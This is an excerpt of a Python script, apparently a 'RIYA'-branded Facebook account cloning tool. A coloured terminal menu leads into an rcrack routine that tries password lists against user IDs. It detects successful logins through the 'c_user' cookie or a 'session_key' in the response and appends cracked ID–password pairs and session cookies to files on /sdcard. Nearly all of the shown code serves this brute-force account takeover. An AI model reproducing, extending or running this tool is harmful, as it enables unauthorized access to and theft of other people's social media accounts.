...
├─\033[38;5;196m[\x1b[38;5;46m=\033[38;5;196m]\x1b[38;5;46m FACEBOOK  \033[38;5;196m:\x1b[38;5;46m RIYA KING　 ツ                 │
├─\033[38;5;196m[\x1b[38;5;46m=\033[38;5;196m]\x1b[38;5;46m GITHUB   \033[38;5;196m :\x1b[38;5;46m RIYA\033[38;5;196m-\x1b[38;5;46m404                       │
...
def manu():
    mahdix.clear()
    print(logo)
    print(f'{W}[1]{Y} Ramdom Bd {Cy}  [V1]')
    print(f'{W}[2]{G} File Coning {Cy}[V1]')
...
def rcrack(uid,pwx,tl):
    ...
    try:
        for ps in pwx:
            sys.stdout.write(f'\r\r {random.choice(mahdix.mycolor)}[{random.choice(mahdix.mycolor)}={random.choice(mahdix.mycolor)}]~[{random.choice(mahdix.mycolor)}RIYA~M2{W}]~[{random.choice(mahdix.mycolor)}OK|CP{random.choice(mahdix.mycolor)}{random.choice(mahdix.mycolor)}]~[{len(cracked)}]~[{random.choice(mahdix.mycolor)}{tl}]~[{random.choice(mahdix.mycolor)}{G}{random.choice(mahdix.mycolor)}{len(oks)}{W}|{random.choice(mahdix.mycolor)}{R}{random.choice(mahdix.mycolor)}{len(cps)}{W}{random.choice(mahdix.mycolor)}] ');sys.stdout.flush()
		    ...
		    # 'cookie': 'datr=v1DpZGdcXU8Q3PMrNQbL6xdx; sb=v1DpZAJcIcik8INylDGOBbVE; m_pixel_ratio=1.7004296779632568; wd=423x800; fr=09bMgr6YweE7gjlIu..Bk6VC_.We.AAA.0.0.Bk6VDf.AWW0haexwo8',
		    'dpr': '2',
            ...
            if 'c_user' in log_cookies:
                ...
                print('\r\r\033[1;32m[RIYA-OK💚] \033[1;32m'+cid+'\033[1;32m • \033[1;32m' +ps+    '  \n[] \033[1;32m'+coki+  '  ''  \033[0;97m')
                open('/sdcard/RIYA-OK.txt', 'a').write( cid+' | '+ps+'\n')
                oks.append(cid)
                break
                ...
                cid = coki[24:39]
                if 'y' in madhi_cp:
                    print('\r\r\33[1;30m[RIYA-CP] ' +uid+ ' • ' +ps+           '  \33[0;97m')
                open('/sdcard/RIYA-CP.txt', 'a').write( uid+' | '+ps+' \n')
                cps.append(cid)
                break
            else:
                continue
        ...
        for pw in pwx:
            ...
            if 'session_key' in responce_json:
                ...
                if uidX not in oks:
                    ...
                    print(f'{G}PASS   : {W}{pw}')
                    open('/sdcard/RIYA-OK.txt', 'a').write(uidX+'|'+pw+'\n')
                    if 'y' in mahdi_coki:
                ...
                if uid not in cps:
                    if 'y' in madhi_cp:
                        print(f'\r{R}[RIYA-CP] {uid}  | {pw} {W}')
                        open('/sdcard/RIYA-CP.txt', 'a').write(uid+'|'+pw+'\n')
                    cps.append(uid)
            else:continue
        cracked.append(uid)
